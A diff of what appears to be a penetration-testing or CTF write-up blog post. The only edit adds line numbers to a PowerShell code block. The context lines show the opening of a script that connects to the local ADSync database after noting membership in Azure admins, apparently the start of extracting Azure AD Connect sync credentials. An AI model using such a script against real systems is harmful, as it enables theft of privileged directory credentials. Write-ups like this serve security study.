@@ -113,7 +113,7 @@ We can see we are a part of the azure admins, this means that with the right com
 
 Here is the script the exe is based on:
 
-{% highlight powershell %}
+{% highlight powershell linenos %}
 $client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
 $client.Open()
 $cmd = $client.CreateCommand()
